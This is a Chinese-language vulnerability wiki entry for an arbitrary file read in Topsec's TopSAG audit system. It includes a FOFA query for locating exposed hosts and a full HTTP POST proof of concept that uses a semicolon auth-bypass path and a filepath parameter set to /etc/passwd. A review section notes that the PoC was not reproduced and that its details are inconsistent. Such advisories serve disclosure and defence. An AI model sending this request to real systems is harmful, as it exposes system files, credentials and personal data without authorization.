---
source: "SourByte05/Vulnerability-Wiki-PoC"
id: "vw-9ebadc7c512c1a47d785beea"
entity_id: "ve-9ebadc7c512c1a47d785beea"
schema_version: "1"
title: "天融信运维安全审计系统download任意文件读取漏洞"
product: "Topsec TopSAG运维安全审计"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无cookie、分号后缀可能绕鉴权；无版本"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9Fdownload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_status: "unknown"
previous_fofa_unverified: "header="
fofa: "header=\"iam\" && server=\"Apache-Coyote/\""
---

# 天融信运维安全审计系统download任意文件读取漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Topsec TopSAG运维安全审计
- 本文讨论：iam/download;.login.jsp filepath任意文件读
- 版本、权限与配置前提：无cookie、分号后缀可能绕鉴权；无版本
- 资料类型：路径读取PoC摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- Content-Length67与短表单不符；没有解释后缀绕过是否必需
- 在野已知/广影响无来源；fofa残缺header=；无固定版本
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 分号路径解析、认证和在野状态待核验
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 漏洞描述

天融信运维安全审计系统TopSAG是基于自主知识产权NGTOS安全操作系统平台和多年网络安全防护经验积累研发而成，系统以4A管理理念为基础、安全代理为核心，在运维管理领域持续创新，为客户提供事前预防、事中监控、事后审计的全方位运维安全解决方案，适用于政府、金融、能源、电信、交通、教育等行业。天融信运维安全审计系统download存在任意文件读取漏洞

# 影响版本

天融信运维安全审计系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：header="iam" && server="Apache-Coyote/"

POC/EXP：

```http
POST /iam/download;.login.jsp HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Content-Length: 67

filename=1.txt&filepath=/etc/passwd
```

![image-20241101122253704](./.resource/天融信运维安全审计系统download任意文件读取漏洞/media/image-20241101122253704.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
